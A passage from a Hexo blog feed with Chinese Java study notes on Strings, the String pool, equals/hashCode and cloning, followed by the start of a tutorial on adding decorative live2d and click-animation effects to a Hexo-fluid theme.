class="hljs-number">10</span>;<span class="hljs-comment">//装箱</span><br><span class="hljs-keyword">int</span> num1 = num;<span class="hljs-comment">//拆箱</span><br></code></pre></div></td></tr></table></figure>基本数据类型和引用数据类型区别</li><li>基本数据类型在被创建时，数值直接存储在栈上。</li><li>引用数据类型在被创建时，对象的具体信息都存储在堆内存上，对象的引用地址存储在栈上</li></ul><h4 id="String类型"><a href="#String类型" class="headerlink" title="String类型"></a>String类型</h4><p>String 不可变，String 类型 是一个final修饰的类型。因此它不可被继承。在 Java 8 中，String 内部使用 char 数组存储数据。</p><figure class="highlight java"><table><tr><td class="gutter hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">String</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">java</span>.<span class="hljs-title">io</span>.<span class="hljs-title">Serializable</span>, <span class="hljs-title">Comparable</span>&lt;<span class="hljs-title">String</span>&gt;, <span class="hljs-title">CharSequence</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">char</span> value[];<br>&#125;<br></code></pre></div></td></tr></table></figure><p>value 数组被声明为 final，这意味着 value 数组初始化之后就不能再引用其它数组。并且 String 内部没有改变 value 数组的方法，因此可以保证 String 不可变。<br>String 不可变的好处</p><ul><li>可以缓存 hash 值：因为 String 的 hash 值经常被使用，例如 String 用做 HashMap 的 key。不可变的特性可以使得 hash 值也不可变，因此只需要进行一次计算。</li><li>String Pool 的需要：如果一个 String 对象已经被创建过了，那么就会从 String Pool 中取得引用。只有 String 是不可变的，才可能使用 String Pool。</li><li>安全性：String 不可变性天生具备线程安全，可以在多个线程中安全地使用。String 经常作为参数，String 不可变性可以保证参数不可变。</li></ul><h4 id="String赋值"><a href="#String赋值" class="headerlink" title="String赋值"></a>String赋值</h4><figure class="highlight java"><table><tr><td class="gutter hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String s1 = <span class="hljs-string">&quot;bbb&quot;</span>;<br>String s2 = <span class="hljs-string">&quot;bbb&quot;</span>;<br>System.out.println(s5 == s6);  <span class="hljs-comment">// true</span><br></code></pre></div></td></tr></table></figure><p>如果是采用 “bbb” 这种字面量的形式创建字符串，会自动地将字符串放入 String Pool 中。而不是象new一样放在压缩堆中；当声明这样的一个字符串后，JVM会在常量池中先查找有没有一个值为”bbb”的对象，</p><ul><li>如果有：就会把它赋给当前引用。即原来那个引用和现在这个引用指点向了同一对象,</li><li>如果没有：则在常量池中新创建一个”bbb”,<br>下一次如果有String s2 = “bbb”；又会将s2指向”abcd”这个对象；即以这形式声明的字符串，只要值相等，任何多个引用都指向同一对象.</li></ul><p>而String s = new String(“abcd”);和其它任何对象一样，每调用一次就产生一个对象</p><figure class="highlight java"><table><tr><td class="gutter hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//代码1  </span><br>String sa = <span class="hljs-string">&quot;ab&quot;</span>;                                          <br>String sb = <span class="hljs-string">&quot;cd&quot;</span>;                                       <br>String sab=sa+sb;                                      <br>String s=<span class="hljs-string">&quot;abcd&quot;</span>;  <br>System.out.println(sab==s); <span class="hljs-comment">// false  </span><br><span class="hljs-comment">//当执行sa+sb时，JVM首先会在堆中创建一个StringBuilder类，将刚生成的String对象的堆地址存放在局部变量sab中</span><br><span class="hljs-comment">//局部变量 s 存储的是常量池中&quot;abcd&quot;所对应的拘留字符串对象的地址</span><br><br><span class="hljs-comment">//代码2  </span><br>String sc=<span class="hljs-string">&quot;ab&quot;</span>+<span class="hljs-string">&quot;cd&quot;</span>;  <br>String sd=<span class="hljs-string">&quot;abcd&quot;</span>;  <br>System.out.println(sc==sd); <span class="hljs-comment">//true  </span><br><span class="hljs-comment">//&quot;ab&quot;+&quot;cd&quot;会直接在编译期就合并成常量&quot;abcd&quot;， 因此相同字面值常量&quot;abcd&quot;所对应的是同一个拘留字符串对象，自然地址也就相同。</span><br></code></pre></div></td></tr></table></figure><p>扩展：</p><figure class="highlight java"><table><tr><td class="gutter hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;abc&quot;</span>)<br></code></pre></div></td></tr></table></figure><p>这种方式一共会创建两个字符串对象（前提是 String Pool 中还没有 “abc” 字符串对象）。</p><ul><li>“abc” 属于字符串字面量，因此编译时期会在 String Pool 中创建一个字符串对象，指向这个字符串字面量；</li><li>而使用 new 的方式会在堆中创建一个字符串对象。</li></ul><h4 id="String、StringBuffer、-StringBuilder的区别"><a href="#String、StringBuffer、-StringBuilder的区别" class="headerlink" title="String、StringBuffer、 StringBuilder的区别"></a>String、StringBuffer、 StringBuilder的区别</h4><ul><li>从运行速度上说，StringBuilder&gt;StringBuffer&gt;String，因为String是不可变的对象</li><li>String：是字符串常量（由final修饰），StringBuffer和StringBuilder 是字符串变量</li><li>StringBuffer：有同步锁，但效率低，适用于多线程下字符缓冲区进行大量操作。</li><li>StringBuilder：效率高，线程不安全，适用于单线程下的字符缓冲区进行大量操作的情况；</li></ul><p>StringBuffer 和 StringBuilder 能大量操作字符的原理<br>在append是后，采用了Arrays.copyOf（） 进行了数组复制</p><figure class="highlight java"><table><tr><td class="gutter hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> StringBuffer <span class="hljs-title">append</span><span class="hljs-params">(Object obj)</span> </span>&#123;<br>    toStringCache = <span class="hljs-keyword">null</span>;<br>    <span class="hljs-keyword">super</span>.append(String.valueOf(obj));<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>;<br>&#125;<br><br><span class="hljs-comment">// AbstractStringBuilder 类</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> AbstractStringBuilder <span class="hljs-title">append</span><span class="hljs-params">(String str)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (str == <span class="hljs-keyword">null</span>)<br>        <span class="hljs-keyword">return</span> appendNull();<br>    <span class="hljs-keyword">int</span> len = str.length();<br>    ensureCapacityInternal(count + len); <span class="hljs-comment">// 采用复制方式增加数组长度</span><br>    str.getChars(<span class="hljs-number">0</span>, len, value, count);<br>    count += len;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">ensureCapacityInternal</span><span class="hljs-params">(<span class="hljs-keyword">int</span> minimumCapacity)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (minimumCapacity - value.length &gt; <span class="hljs-number">0</span>) &#123;<br>        value = Arrays.copyOf(value,<br>                              newCapacity(minimumCapacity));<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="String-Pool"><a href="#String-Pool" class="headerlink" title="String Pool"></a>String Pool</h4><ul><li>字符串常量池（String Pool）保存着所有字符串字面量（literal strings），这些字面量在编译时期就确定</li><li>String 的 intern() 方法在运行过程中将字符串添加到 String Pool 中<figure class="highlight java"><table><tr><td class="gutter hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String s1 = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;aaa&quot;</span>);<br>String s2 = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;aaa&quot;</span>);<br>System.out.println(s1 == s2);           <span class="hljs-comment">// false</span><br>String s3 = s1.intern();<br>String s4 = s2.intern();<br>System.out.println(s3 == s4);           <span class="hljs-comment">// true</span><br></code></pre></div></td></tr></table></figure>String#intern 方法：intern 方法会从字符串常量池中查询当前字符串是否存在，若不存在就会将当前字符串放入常量池中返回这个新字符串的引用，若存在（使用 equals() 方法进行确定）那么就会返回 String Pool 中字符串的引用；</li></ul><p>在 Java 7 之前，String Pool 被放在运行时常量池中，它属于永久代。而在 Java 7，String Pool 被移到堆中。这是因为永久代的空间有限，在大量使用字符串的场景下会导致 OutOfMemoryError 错误。</p><h4 id="String-常用方法"><a href="#String-常用方法" class="headerlink" title="String 常用方法"></a>String 常用方法</h4><figure class="highlight java"><table><tr><td class="gutter hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">endsWith</span><span class="hljs-params">(String suffix)</span> <span class="hljs-comment">//测试此字符串是否以指定的后缀结束</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">startsWith</span><span class="hljs-params">(String prefix)</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">char</span> <span class="hljs-title">charAt</span><span class="hljs-params">(<span class="hljs-keyword">int</span> index)</span></span>;<span class="hljs-comment">//返回指定索引处的 char 值</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">indexOf</span><span class="hljs-params">(String str)</span> </span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">lastIndexOf</span><span class="hljs-params">(<span class="hljs-keyword">int</span> ch)</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String[] <span class="hljs-title">split</span><span class="hljs-params">(String regex)</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">substring</span><span class="hljs-params">(<span class="hljs-keyword">int</span> beginIndex)</span>   </span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">replace</span><span class="hljs-params">(<span class="hljs-keyword">char</span> oldChar,<span class="hljs-keyword">char</span> newChar)</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">length</span><span class="hljs-params">()</span></span><br></code></pre></div></td></tr></table></figure><h4 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h4><p>在 Java 中 Object 是所有的祖类。</p><h4 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h4><figure class="highlight java"><table><tr><td class="gutter hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">native</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hashCode</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">equals</span><span class="hljs-params">(Object obj)</span></span><br><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">native</span> Object <span class="hljs-title">clone</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> CloneNotSupportedException</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">native</span> Class&lt;?&gt; <span class="hljs-title">getClass</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">finalize</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">native</span> <span class="hljs-keyword">void</span> <span class="hljs-title">notify</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">native</span> <span class="hljs-keyword">void</span> <span class="hljs-title">notifyAll</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">native</span> <span class="hljs-keyword">void</span> <span class="hljs-title">wait</span><span class="hljs-params">(<span class="hljs-keyword">long</span> timeout)</span> <span class="hljs-keyword">throws</span> InterruptedException</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title">wait</span><span class="hljs-params">(<span class="hljs-keyword">long</span> timeout, <span class="hljs-keyword">int</span> nanos)</span> <span class="hljs-keyword">throws</span> InterruptedException</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title">wait</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException</span><br></code></pre></div></td></tr></table></figure><p>equals()</p><ul><li>对于基本类型，== 判断两个值是否相等，基本类型没有 equals() 方法。</li><li>对于引用类型，== 判断两个变量是否引用同一个对象，而 equals() 判断引用的对象是否等价。<h4 id="“-”和equals的区别"><a href="#“-”和equals的区别" class="headerlink" title="“==”和equals的区别"></a>“==”和equals的区别</h4>==： 用来判断两个对象的内存地址是否相同（比较的是变量(栈)内存中存放的对象的(堆)内存地址，）。比较的是真正意义上的指针操作。</li></ul><p>equals：用来比较的是两个对象的内容是否相等<br>例如：</p><figure class="highlight java"><table><tr><td class="gutter hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String s1 = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;ab&quot;</span>); <span class="hljs-comment">// s1 为一个引用</span><br>String s2 = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;ab&quot;</span>); <span class="hljs-comment">// s2 为另一个引用,对象的内容一样</span><br>String s3 = <span class="hljs-string">&quot;ab&quot;</span>; <span class="hljs-comment">// 放在常量池中</span><br>String s4 = <span class="hljs-string">&quot;ab&quot;</span>; <span class="hljs-comment">// 从常量池中查找</span><br>System.out.println(s1 == s2); <span class="hljs-comment">// false</span><br>System.out.println(s3 == s4); <span class="hljs-comment">// true</span><br>System.out.println(s1 == s3); <span class="hljs-comment">// false</span><br>System.out.println(s1.equals(s2)); <span class="hljs-comment">// true</span><br>System.out.println(s3.equals(s4)); <span class="hljs-comment">// true</span><br>System.out.println(s1.equals(s3)); <span class="hljs-comment">// true</span><br></code></pre></div></td></tr></table></figure><p>对equals重新需要注意五点：</p><blockquote><p>1 自反性：对任意引用值X，x.equals(x)的返回值一定为true；<br>2 对称性：对于任何引用值x,y,当且仅当y.equals(x)返回值为true时，x.equals(y)的返回值一定为true；<br>3 传递性：如果x.equals(y)=true, y.equals(z)=true,则x.equals(z)=true ；<br>4 一致性：如果参与比较的对象没任何改变，则对象比较的结果也不应该有任何改变；<br>5 非空性：任何非空的引用值X，x.equals(null)的返回值一定为false 。</p></blockquote><h4 id="hashCode"><a href="#hashCode" class="headerlink" title="hashCode()"></a>hashCode()</h4><p>hashCode() 返回散列值，而 equals() 是用来判断两个对象是否等价。等价的两个对象散列值一定相同，但是散列值相同的两个对象不一定等价。</p><p>所以：在覆盖 equals() 方法时应当总是覆盖 hashCode() 方法，保证等价的两个对象散列值也相等。</p><h4 id="hashCode（）与equals（）"><a href="#hashCode（）与equals（）" class="headerlink" title="hashCode（）与equals（）"></a>hashCode（）与equals（）</h4><p>1.如果两个对象相等，则hashcode一定也是相同的<br>2.两个对象相等,对两个对象分别调用equals方法都返回true<br>3.两个对象有相同的hashcode值，它们也不一定是相等的<br>4.因此，equals 方法被覆盖过，则 hashCode 方法也必须被覆盖<br>5.hashCode() 的默认行为是对堆上的对象产生独特值。如果没有重写 hashCode()，则该 class 的两个对象无论如何都不会相等（即使这两个对象指向相同的数据）</p><h4 id="clone"><a href="#clone" class="headerlink" title="clone()"></a>clone()</h4><p>clone() 是 Object 的 protected 方法，它不是 public，一个类不显式去重写 clone()，其它类就不能直接去调用该类实例的 clone() 方法。</p><p>克隆（clone方法）为浅拷贝<br>1.浅拷贝：对基本数据类型进行值拷贝，对引用数据类型的引用地址进行拷贝，拷贝对象和原始对象的引用类型引用同一个对象</p><p>2.深拷贝： 对基本数据类型进行值拷贝，对引用数据类型的内容进行拷贝，拷贝对象和原始对象的引用类型引用不同对象。</p><p>深拷贝实现：</p><ul><li>序列化（serialization）这个对象，再反序列化回来，就可以得到这个新的对象，无非就是序列化的规则需要我们自己来写。</li><li>实现Clonable接口，覆盖并重写clone()，除了调用父类中的clone方法得到新的对象， 还要将该类中的引用变量也clone出来。如果只是用Object中默认的clone方法，是浅拷贝的<figure class="highlight java"><table><tr><td class="gutter hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Cloneable</span> </span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span>[] arr = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>&#125;;<br><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">protected</span> Test <span class="hljs-title">clone</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> CloneNotSupportedException </span>&#123;<br>Test newBody = (Test) <span class="hljs-keyword">super</span>.clone();<br>newBody.arr = arr.clone();    <span class="hljs-comment">// 深拷贝实现</span><br><span class="hljs-keyword">return</span> newBody;<br>&#125;<br>   <br>&#125;<br></code></pre></div></td></tr></table></figure>开发中常用的对象拷贝工具：<br>例如DozerMapper、Apache BeanUtils、Spring、Jodd BeanUtils、甚至是Cglib 都提供了这样的功能</li></ul><p>选择Cglib的 BeanCopier 进行Bean拷贝的理由是，其性能要比 **Spring的BeanUtils <strong>，</strong>Apache的BeanUtils **和 PropertyUtils 要好很多，尤其是数据量比较大的情况下</p><p>Cglib 的beans 包 操作:</p><ul><li>BeanCopier：用于两个bean之间，同名属性间的拷贝。</li><li>BulkBean：用于两个bean之间，自定义get&amp;set方法间的拷贝。</li><li>BeanMap：针对POJO Bean与Map对象间的拷贝。</li><li>BeanGenerator：根据Map&lt;String,Class&gt;properties的属性定义，动态生成POJO Bean类。</li></ul>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>hexo-fluid主题-页面美化效果实现</title>
    <link href="/2021/04/08/hexo-fluid%E4%B8%BB%E9%A2%98-%E9%A1%B5%E9%9D%A2%E7%BE%8E%E5%8C%96%E6%95%88%E6%9E%9C%E5%AE%9E%E7%8E%B0/"/>
    <url>/2021/04/08/hexo-fluid%E4%B8%BB%E9%A2%98-%E9%A1%B5%E9%9D%A2%E7%BE%8E%E5%8C%96%E6%95%88%E6%9E%9C%E5%AE%9E%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>hexo-fluid主题。页面添加动态线条、下雪、代码雨等效果。</p><h2 id="效果目录"><a href="#效果目录" class="headerlink" title="效果目录"></a>效果目录</h2><h3 id="1-添加卡通人物"><a href="#1-添加卡通人物" class="headerlink" title="1.添加卡通人物"></a>1.添加卡通人物</h3><p>项目的地址，<a href="https://github.com/EYHN/hexo-helper-live2d">点击此处进入</a><br>输入如下命令获取</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">$ npm install --save hexo-helper-live2d  <br></code></pre></div></td></tr></table></figure><p>输入以下命令，下载相应的模型，将 packagename 更换成模型名称即可。<a href="https://github.com/xiazeyu/live2d-widget-models">更多模型</a></p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">$ npm install packagename<br></code></pre></div></td></tr></table></figure><p>打开站点目录下的 _config.yml 文件，添加如下代码</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">live2d:<br><span class="hljs-built_in">enable</span>: <span class="hljs-literal">true</span><br>scriptFrom: <span class="hljs-built_in">local</span><br>model: <br>use: live2d-widget-model-haruto <span class="hljs-comment">#模型选择</span><br>display: <br>position: right  <span class="hljs-comment">#模型位置</span><br>width: 150       <span class="hljs-comment">#模型宽度</span><br>height: 300      <span class="hljs-comment">#模型高度</span><br>mobile: <br>show: <span class="hljs-literal">false</span>      <span class="hljs-comment">#是否在手机端显示</span><br></code></pre></div></td></tr></table></figure><p>之后就可以看见卡通人物头像了。</p><hr><h3 id="2-添加鼠标点击爱心效果"><a href="#2-添加鼠标点击爱心效果" class="headerlink" title="2.添加鼠标点击爱心效果"></a>2.添加鼠标点击爱心效果</h3><p>在 \themes\hexo-theme-spfk\source\js （其中hexo-theme-spfk为你主题的文件夹名，即在自己的主题中进行操作）下新建文件 love.js，在 love.js 文件中添加以下代码：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">!<span class="hljs-keyword">function</span>(e,t,a)&#123;<span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">n</span></span>()&#123;c(<span class="hljs-string">&quot;.heart&#123;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);&#125;.heart:after,.heart:before&#123;content: &#x27;&#x27;;width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 500%;-moz-border-radius: 50%;position: fixed;&#125;.heart:after&#123;top: -5px;&#125;.heart:before&#123;left: -5px;&#125;&quot;</span>),o(),r()&#125;<span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">r</span></span>()&#123;<span class="hljs-keyword">for</span>(var e=0;e&lt;d.length;e++)d[e].alpha&lt;=0?(t.body.removeChild(d[e].el),d.splice(e,1)):(d[e].y--,d[e].scale+=.004,d[e].alpha-=.013,d[e].el.style.cssText=<span class="hljs-string">&quot;left:&quot;</span>+d[e].x+<span class="hljs-string">&quot;px;top:&quot;</span>+d[e].y+<span class="hljs-string">&quot;px;opacity:&quot;</span>+d[e].alpha+<span class="hljs-string">&quot;;transform:scale(&quot;</span>+d[e].scale+<span class="hljs-string">&quot;,&quot;</span>+d[e].scale+<span class="hljs-string">&quot;) rotate(45deg);background:&quot;</span>+d[e].color+<span class="hljs-string">&quot;;z-index:99999&quot;</span>);requestAnimationFrame(r)&#125;<span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">o</span></span>()&#123;var t=<span class="hljs-string">&quot;function&quot;</span>==typeof e.onclick&amp;&amp;e.onclick;e.onclick=<span class="hljs-keyword">function</span>(e)&#123;t&amp;&amp;t(),i(e)&#125;&#125;<span class="hljs-keyword">function</span> i(e)&#123;var a=t.createElement(<span class="hljs-string">&quot;div&quot;</span>);a.className=<span class="hljs-string">&quot;heart&quot;</span>,d.push(&#123;el:a,x:e.clientX-5,y:e.clientY-5,scale:1,alpha:1,color:s()&#125;),t.body.appendChild(a)&#125;<span class="hljs-keyword">function</span> c(e)&#123;var a=t.createElement(<span class="hljs-string">&quot;style&quot;</span>);a.type=<span class="hljs-string">&quot;text/css&quot;</span>;try&#123;a.appendChild(t.createTextNode(e))&#125;catch(t)&#123;a.styleSheet.cssText=e&#125;t.getElementsByTagName(<span class="hljs-string">&quot;head&quot;</span>)[0].appendChild(a)&#125;<span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">s</span></span>()&#123;<span class="hljs-built_in">return</span><span class="hljs-string">&quot;rgb(&quot;</span>+~~(255*Math.random())+<span class="hljs-string">&quot;,&quot;</span>+~~(255*Math.random())+<span class="hljs-string">&quot;,&quot;</span>+~~(255*Math.random())+<span class="hljs-string">&quot;)&quot;</span>&#125;var d=[];e.requestAnimationFrame=<span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<span class="hljs-built_in">return</span> e.requestAnimationFrame||e.webkitRequestAnimationFrame||e.mozRequestAnimationFrame||e.oRequestAnimationFrame||e.msRequestAnimationFrame||<span class="hljs-keyword">function</span>(e)&#123;setTimeout(e,1e3/60)&#125;&#125;(),n()&#125;(window,document);<br></code></pre></div></td></tr></table></figure><p>在 \themes\hexo-theme-spfk\layout\layout.ejs 文件末尾添加以下代码：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">&lt;!-- 页面点击小红心 --&gt;<br>&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span> src=<span class="hljs-string">&quot;/js/love.js&quot;</span>&gt;&lt;/script&gt;<br></code></pre></div></td></tr></table></figure><p>完成后，点击鼠标时就可以看见效果了。</p><h3 id="3-添加鼠标点击显示文字效果"><a href="#3-添加鼠标点击显示文字效果" class="headerlink" title="3.添加鼠标点击显示文字效果"></a>3.添加鼠标点击显示文字效果</h3><p>在 /themes/hexo-theme-spfk/source/js 下新建文件 click_show_text.js，在 click_show_text.js 文件中添加以下代码：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">var a_idx = <span class="hljs-number">0</span>;<br>jQuery(document).ready(function($) &#123;<br>    $(<span class="hljs-string">&quot;body&quot;</span>).click(function(e) &#123;<br>        var a = <span class="hljs-keyword">new</span> Array<br>        (<span class="hljs-string">&quot;富强&quot;</span>, <span class="hljs-string">&quot;民主&quot;</span>, <span class="hljs-string">&quot;文明&quot;</span>, <span class="hljs-string">&quot;和谐&quot;</span>, <span class="hljs-string">&quot;自由&quot;</span>, <span class="hljs-string">&quot;平等&quot;</span>, <span class="hljs-string">&quot;公正&quot;</span>, <span class="hljs-string">&quot;法治&quot;</span>, <span class="hljs-string">&quot;爱国&quot;</span>, <span class="hljs-string">&quot;敬业&quot;</span>, <span class="hljs-string">&quot;诚信&quot;</span>, <span class="hljs-string">&quot;友善&quot;</span>);<br>        var $i = $(<span 